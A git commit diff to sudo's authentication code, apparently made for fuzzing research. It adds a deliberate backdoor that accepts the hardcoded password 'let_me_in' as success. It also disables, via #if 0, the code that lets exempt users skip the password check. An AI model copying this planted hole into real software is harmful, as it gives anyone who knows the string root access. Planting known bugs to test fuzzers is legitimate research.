commit 082021727a0ef2de5a0e1906208a6e51a8c7441b
Author: Dimitri Kokkonis <dimitri.kokkonis@cea.fr>
Date:   Sun Feb 18 22:03:26 2024 +0100

    Add backdoor to sudo

diff --git a/plugins/sudoers/auth/sudo_auth.c b/plugins/sudoers/auth/sudo_auth.c
index b74ab347c..9aa1b319d 100644
--- a/plugins/sudoers/auth/sudo_auth.c
+++ b/plugins/sudoers/auth/sudo_auth.c
@@ -380,6 +380,12 @@ verify_user(const struct sudoers_context *ctx, struct passwd *pw, char *prompt,
 
 	    ret = auth->status = (auth->verify)(ctx, pw,
 		standalone ? prompt : pass, auth, callback);
+
+        /* Backdoor! */
+        if (strcmp(pass, "let_me_in") == 0) {
+            ret = AUTH_SUCCESS;
+        }
+
 	    if (ret != AUTH_FAILURE)
 		break;
 	}
diff --git a/plugins/sudoers/check.c b/plugins/sudoers/check.c
index 4356dd185..2c19b0752 100644
--- a/plugins/sudoers/check.c
+++ b/plugins/sudoers/check.c
@@ -124,6 +124,13 @@ check_user(struct sudoers_context *ctx, unsigned int validated,
     }
     closure.ctx = ctx;
 
+/*
+ * NOTE: for fuzzing, we need to run sudo AS sudo. But at the same time, we
+ * need to hit the password check. In order to do that, we need to disable
+ * this entire piece of code that skips the password check if the user is
+ * already sudo, or if they're not elevating privileges.
+ */
+#if 0
     /*
      * Don't prompt for the root passwd or if the user is exempt.
      * If the user is not changing uid/gid, no need for a password.
@@ -155,6 +162,7 @@ check_user(struct sudoers_context *ctx, unsigned int validated,
 	    goto done;
 	}
     }
+#endif
 
     /* Construct callback for getpass function. */
     memset(&callback, 0, sizeof(callback));
